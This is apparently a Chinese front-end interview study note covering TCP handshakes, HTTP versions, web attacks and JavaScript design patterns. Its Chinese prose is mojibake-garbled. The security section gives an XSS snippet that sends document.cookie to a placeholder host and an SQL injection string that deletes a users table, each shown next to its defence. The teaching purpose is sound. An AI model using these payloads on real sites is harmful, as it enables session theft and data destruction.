å…ˆå»ºç«‹è¿æ¥ å†ä¼ è¾“å†…å®¹ ç½‘ç»œè¿æ¥æ˜¯ TCP åè®® ä¼ è¾“å†…å®¹æ˜¯ HTTP åè®®

### **3æ¬¡æ¡æ‰‹**

Client å‘åŒ…ï¼ŒServer æ¥æ”¶ã€‚Server:æœ‰ Client è¦æ‰¾æˆ‘    **toåœ¨å—**

Server å‘åŒ…ï¼ŒClient æ¥æ”¶ã€‚Client : Server å·²ç»æ”¶åˆ°ä¿¡æ¯äº†  **fromæˆ‘åœ¨**

Client å‘åŒ…ï¼ŒServer æ¥æ”¶ã€‚Server: Client è¦å‡†å¤‡å‘é€ **toé‚£æˆ‘æ¥äº†**

### **æ•°æ®ä¼ è¾“**

### å››æ¬¡æŒ¥æ‰‹

Client å‘åŒ…ï¼ŒServer æ¥æ”¶ã€‚Server : Client å·²è¯·æ±‚ç»“æŸ  **to æˆ‘è¯¥å‘çš„è¯·æ±‚éƒ½å‘å¥½äº†**

Server å‘åŒ…ï¼ŒClient æ¥æ”¶ã€‚Client : Server å·²æ”¶åˆ°ï¼Œæˆ‘ç­‰å¾…å®ƒå…³é—­  **from å¥½çš„æˆ‘çŸ¥é“ä½ éœ€è¦å‘çš„è¯·æ±‚éƒ½å‘å¥½äº†**

Server å‘åŒ…ï¼ŒClient æ¥æ”¶ã€‚Client : Server æ­¤æ—¶å¯ä»¥å…³é—­è¿æ¥äº† **from æˆ‘éœ€è¦ç»™ä½ çš„ä¸œè¥¿éƒ½ç»™äº†**

Client å‘åŒ…ï¼ŒServer æ¥æ”¶ã€‚Server:å¯ä»¥å…³é—­äº†( ç„¶åå…³é—­è¿æ¥ï¼‰ **to å¥½çš„æˆ‘çŸ¥é“äº† ä½ å¯ä»¥æ–­å¼€è¿æ¥äº†**

![TCP](https://raw.githubusercontent.com/zhang874010534/tuchuan/main/interview/TCP.png)

## Http

### 1.1

- ç¼“å­˜ç­–ç•¥ cache-control E-tagç­‰
- æ”¯æŒé•¿è¿æ¥ Connection: keep-alive, ä¸€æ¬¡ TCPè¿æ¥å¤šæ¬¡è¯·æ±‚
- æ–­ç‚¹ç»­ä¼ ï¼ŒçŠ¶æ€ç  206
- æ”¯æŒæ–°çš„æ–¹æ³• PUT DELETE ç­‰ï¼Œ Restful API

### 2.0

- å¤´éƒ¨å‹ç¼©
- å¤šè·¯å¤ç”¨ï¼Œä¸€ä¸ª TCP è¿æ¥ä¸­å¯ä»¥å¤šä¸ª HTTP å¹¶è¡Œè¯·æ±‚
- æœåŠ¡ç«¯æ¨é€

# ç½‘ç»œå®‰å…¨

## XSS

> Cross Site Script è·¨ç«™è„šæœ¬æ”»å‡»

é»‘å®¢å°† JS ä»£ç æ’å…¥åˆ°ç½‘é¡µå†…å®¹ä¸­ï¼Œæ¸²æŸ“æ—¶æ‰§è¡ŒJSä»£ç 

ç‰¹æ®Šå­—ç¬¦æ›¿æ¢(å‰ç«¯æˆ–è€…åç«¯ï¼‰, æ¯”å¦‚< æ›¿æ¢æˆ`&lt;` >æ›¿æ¢æˆ `&gt;`

```html
  <div>
    <script>
      let img = document.createElement('image')
      img.src = 'https://xx.com/cookie=' + document.cookie
    </script>
   </div>
```

Vue v-html

React dangerouslySetInnerHTML

éœ€è¦æ³¨æ„ xss æ”»å‡»çš„é—®é¢˜

æ¯”å¦‚vue  ç›´æ¥{{}} æ”¾åˆ°é¡µé¢ä¸­æ˜¯ä¸éœ€è¦æ‹…å¿ƒè¿™ä¸ªé—®é¢˜çš„

## CSRF

> Cross Site Request Forgery è·¨ç«™è¯·æ±‚ä¼ªé€ 

é»‘å®¢è¯±å¯¼ç”¨æˆ·å»è®¿é—®å¦ä¸€ä¸ªç½‘ç«™çš„æ¥å£ï¼Œä¼ªé€ è¯·æ±‚

ä¸¥æ ¼çš„è·¨åŸŸé™åˆ¶+éªŒè¯ç æœºåˆ¶

**ç±»ä¼¼è¿‡ç¨‹**

ç”¨æˆ·ç™»å½•äº†Aç½‘ç«™ï¼Œæœ‰äº† cookie

é»‘å®¢è¯±å¯¼ç”¨æˆ·åˆ°Bç½‘ç«™ï¼Œå¹¶å‘èµ·Aç½‘ç«™çš„è¯·æ±‚

Aç½‘ç«™çš„APIå‘ç°æœ‰ cookieï¼Œè®¤ä¸ºæ˜¯ç”¨æˆ·è‡ªå·±æ“ä½œçš„

**é¢„é˜²æ‰‹æ®µ**

- ä¸¥æ ¼çš„è·¨åŸŸè¯·æ±‚é™åˆ¶ï¼Œå¦‚åˆ¤æ–­ referrer (è¯·æ±‚æ¥æº)
- ä¸º cookie è®¾ç½®SameSite ç¦æ­¢è·¨åŸŸä¼ é€’cookie
- å…³é”®æ¥å£ä½¿ç”¨çŸ­ä¿¡éªŒè¯ç 

## ç‚¹å‡»åŠ«æŒ

æ¯”å¦‚ä¸€ä¸ªAé¡µé¢æ”¾äº†ä¸€ä¸ªæŠ½å¥–æŒ‰é’®ï¼ŒæŠ½å¥–æŒ‰é’®ä¸Šé¢éšè—äº†ä¸€ä¸ªiframeï¼Œå¯¹åº”åˆ°æ¯”å¦‚xxç½‘ç«™çš„å…³æ³¨æŒ‰é’®ä¸Šï¼Œç”¨æˆ·ç‚¹å‡»æŠ½å¥–æŒ‰é’®ï¼Œå…¶å®ç‚¹å‡»çš„æ˜¯å…³æ³¨æŒ‰é’®ï¼Œé‚£å°±å¤šäº†ä¸€ä¸ªç²‰ä¸

æ‰€ä»¥xxç½‘ç«™éœ€è¦åšé˜²æŠ¤

```js
  if (top.location.hostname !== self.location.hostname) {
    alert('æ‚¨æ­£åœ¨è®¿é—®ä¸å®‰å…¨çš„é¡µé¢ï¼Œå³å°†è·³è½¬åˆ°å®‰å…¨é¡µé¢')
    top.location.href = self.location.href
  }
```

## DDosï¼ˆè·Ÿå‰ç«¯å°±æ²¡å…³ç³»äº†ï¼‰

Distribute denial-of-service åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡

åˆ†å¸ƒå¼çš„ã€å¤§è§„æ¨¡çš„æµé‡è®¿é—®ï¼Œä½¿æœåŠ¡å™¨ç˜«ç—ª

## SQLæ³¨å…¥

ä»¥å‰å‰åç«¯ä¸åˆ†ç¦»çš„é¡¹ç›®å¯èƒ½ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜

å‡å¦‚usernameæ˜¯  '; delete from users;  -- 

```sql
select * from users where username='zhangsan' and pword='123';; delete from users; --
select * from users where username=''; delete from users;  -- 'and pword='123;
```

è§£å†³æ–¹æ³•ä¹Ÿæ˜¯å¤„ç†ç‰¹æ®Šå­—ç¬¦ 

# è®¾è®¡æ¨¡å¼

> å¼€æ”¾å°é—­åŸåˆ™ï¼Œå¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å°é—­

## å·¥å‚æ¨¡å¼

ç”¨ä¸€ä¸ªå·¥å‚å‡½æ•°ï¼Œæ¥åˆ›å»ºå®ä¾‹ï¼Œéšè— newï¼Œå¦‚ jQuery $ å‡½æ•°

```js
class Foo {}

function factory() {
    // åˆ¤æ–­çš„é€»è¾‘å†™åˆ°è¿™é‡Œæ¥ ä¸ä¼šå½±å“ Foo æ„é€ å‡½æ•°
    return new Foo()
}

const f = factory()
```

## å•ä¾‹æ¨¡å¼

> å…¨å±€å”¯ä¸€çš„å®ä¾‹ï¼Œæ¯”å¦‚Vuex çš„ store

 ```tsx
 class Singleton {
   private constructor() {
   }
   private static instance: Singleton
   public static getInstance() {
     if(!this.instance) {
       this.instance = new Singleton()
     }
     return this.instance
   }
 }
 const s = Singleton.getInstance()
 const s2 = Singleton.getInstance()
 console.log(s === s2) // true
 ```

## ä»£ç†æ¨¡å¼

ä½¿ç”¨è€…ä¸èƒ½ç›´æ¥è®¿é—®å¯¹è±¡ï¼Œè€Œæ˜¯è®¿é—®ä¸€ä¸ªä»£ç†å±‚

åœ¨ä»£ç†å±‚å¯ä»¥ç›‘å¬ get set åšå¾ˆå¤šäº‹æƒ…

å¦‚ ES6 Proxy å®ç° Vue3 å“åº”å¼

## è§‚å¯Ÿè€…æ¨¡å¼

ç”±å…·ä½“ç›®æ ‡è°ƒåº¦çš„

```js
// ä¸€ä¸ªä¸»é¢˜ï¼Œä¸€ä¸ªè§‚å¯Ÿè€…ï¼Œä¸»é¢˜å˜åŒ–ä¹‹åè§¦å‘è§‚å¯Ÿè€…æ‰§è¡Œ 
btn.addEventListener('click',() => {})
```

## å‘å¸ƒè®¢é˜…æ¨¡å¼

å‘å¸ƒ/è®¢é˜…æ¨¡å¼æ˜¯ç»Ÿä¸€ç”±è°ƒåº¦ä¸­å¿ƒè°ƒçš„

```js
event.on('event-key', () => {
    // äº‹ä»¶1
})

event.on('event-key', () => {
    // äº‹ä»¶2
})

// è§¦å‘
event.emit('event-key')
```

## è£…é¥°å™¨æ¨¡å¼

åŸåŠŸèƒ½ä¸å˜ï¼Œå¢åŠ ä¸€äº›æ–°åŠŸèƒ½(AOP é¢å‘åˆ‡é¢ç¼–ç¨‹)

ES å’ŒTypescript çš„ Decorator è¯­æ³•

ç±»è£…é¥°å™¨ï¼Œæ–¹æ³•è£…é¥°å™¨

```tsx
function Greeter(greeting: string) {
  return function (target: Function) {
    target.prototype.greet = function (): void {
      console.log(greeting);
    };
  };
}

@Greeter("Hello TS!")
class Greeting {
  constructor() {
    // å†…éƒ¨å®ç°
  }
}

let myGreeting = new Greeting();
(myGreeting as any).greet(); // console output: 'Hello TS!';
```

